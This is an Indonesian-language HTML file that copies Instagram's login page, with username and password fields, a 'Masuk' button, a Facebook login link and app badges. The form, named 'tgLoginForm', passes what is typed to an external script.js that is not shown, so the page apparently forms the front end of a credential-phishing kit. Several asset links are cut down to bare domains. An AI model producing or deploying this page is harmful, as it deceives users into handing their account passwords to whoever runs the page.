<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="stylesheet" href="style.css">
    <!-- Pustaka Ikon Font Awesome -->
    <link rel="stylesheet" href="https://cloudflare.com">
</head>
<body>

    <div class="main-container">
        <!-- Kotak Utama Login -->
        <div class="box login-container">
            <div class="logo-box">
                <!-- Teks Logo Instagram -->
                <h1>Instagram</h1>
            </div>

            <!-- Form Penginputan -->
            <form id="tgLoginForm">
                <div class="input-field">
                    <input type="text" id="username" placeholder="Nomor telepon, nama pengguna, atau email" required>
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Kata sandi" required>
                </div>
                <button type="submit" class="btn-login" id="submitBtn">Masuk</button>
            </form>

            <!-- Pembatas "ATAU" -->
            <div class="divider">
                <div class="line"></div>
                <div class="text">ATAU</div>
                <div class="line"></div>
            </div>

            <!-- Login via Facebook -->
            <div class="fb-login">
                <a href="#"><i class="fa-brands fa-square-facebook"></i> Masuk dengan Facebook</a>
            </div>

            <!-- Lupa Kata Sandi -->
            <div class="forgot-password">
                <a href="#">Lupa kata sandi?</a>
            </div>
        </div>

        <!-- Kotak Bawah (Daftar Akun) -->
        <div class="box signup-container">
            <p>Tidak punya akun? <a href="#">Daftar</a></p>
        </div>

        <!-- Bagian Unduh Aplikasi -->
        <div class="get-app">
            <p>Dapatkan aplikasi.</p>
            <div class="app-images">
                <img src="https://cdninstagram.com" alt="Unduh di Google Play" style="height: 40px;">
                <img src="https://cdninstagram.com" alt="Unduh dari Microsoft" style="height: 40px;">
            </div>
        </div>
    </div>

    <!-- Menghubungkan ke JavaScript -->
    <script src="script.js"></script>
</body>
</html>
